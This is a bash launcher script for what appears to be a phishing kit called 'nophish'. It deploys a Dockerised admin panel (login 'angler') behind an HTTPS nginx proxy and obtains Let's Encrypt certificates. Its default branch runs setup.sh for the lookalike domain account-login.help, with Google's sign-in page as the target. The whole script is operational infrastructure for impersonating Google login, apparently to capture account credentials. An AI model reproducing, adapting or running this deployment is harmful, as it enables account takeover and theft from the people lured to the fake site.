#!/bin/bash

case "$1" in
"panel")
	PANEL_DOMAIN="${2:-localhost}"
	echo "[+] Deploying Admin Panel with HTTPS"
	echo "[+] Panel domain: $PANEL_DOMAIN"

	# Create docker network for panel <-> nginx communication
	sudo docker network create panel-net 2>/dev/null || true

	# Stop existing containers
	sudo docker rm -f nophish-panel nophish-nginx 2>/dev/null

	# Generate password and secret key if not set
	ADMIN_PASSWORD="${ADMIN_PASSWORD:-$(openssl rand -hex 16)}"
	SECRET_KEY="${SECRET_KEY:-$(openssl rand -hex 32)}"

	# Start panel (Flask app - internal only, not exposed to host)
	# Connect to both panel-net (for nginx) AND bridge (for VNC containers)
	sudo docker run -d \
		--name nophish-panel \
		--network bridge \
		-v /var/run/docker.sock:/var/run/docker.sock \
		-v "$(pwd)/output:/app/output" \
		-v "$(pwd)/vnc:/app/vnc" \
		-v "$(pwd)/proxy:/app/proxy" \
		-v /etc/letsencrypt:/etc/letsencrypt:ro \
		-e ADMIN_USERNAME=angler \
		-e ADMIN_PASSWORD="$ADMIN_PASSWORD" \
		-e SECRET_KEY="$SECRET_KEY" \
		-e OUTPUT_DIR=/app/output \
		nophish-panel

	# Also connect panel to panel-net so nginx can reach it
	sudo docker network connect --alias panel panel-net nophish-panel 2>/dev/null

	# Start nginx (HTTPS reverse proxy - exposed on 80/443)
	sudo docker run -d \
		--name nophish-nginx \
		--network panel-net \
		-p 80:80 \
		-p 443:443 \
		-v /etc/letsencrypt:/etc/letsencrypt \
		-v "$(pwd)/certbot-www:/var/www/certbot" \
		-e PANEL_DOMAIN="$PANEL_DOMAIN" \
		nophish-nginx

	sleep 3
	echo ""
	echo "[+] Panel deployed!"
	echo "[+] Access: https://$PANEL_DOMAIN"
	echo "[+] Credentials:"
	echo "    Username: angler"
	echo "    Password: $ADMIN_PASSWORD"
	echo ""
	echo "[*] If using a new domain, run: ./run.sh certbot <domain>"
	;;

"certbot")
	DOMAIN="${2}"
	if [ -z "$DOMAIN" ]; then
		echo "Usage: ./run.sh certbot <domain>"
		exit 1
	fi
	echo "[+] Issuing Let's Encrypt certificate for $DOMAIN"
	# Stop nginx briefly so certbot can bind port 80
	sudo docker stop nophish-nginx 2>/dev/null
	sudo certbot certonly --standalone --non-interactive --agree-tos \
		--email "admin@$DOMAIN" -d "$DOMAIN" --preferred-challenges http
	sudo docker start nophish-nginx 2>/dev/null
	echo "[+] Certificate issued. Restart nginx: docker restart nophish-nginx"
	;;

"stop")
	echo "[-] Stopping panel containers"
	sudo docker rm -f nophish-panel nophish-nginx 2>/dev/null
	echo "[+] Panel stopped"
	;;

*)
	C=/etc/letsencrypt/live/account-login.help/fullchain.pem
	K=/etc/letsencrypt/live/account-login.help/privkey.pem
	./setup.sh -u 1 -d account-login.help -t https://accounts.google.com -s true -c "$C" -k "$K"
	;;
esac
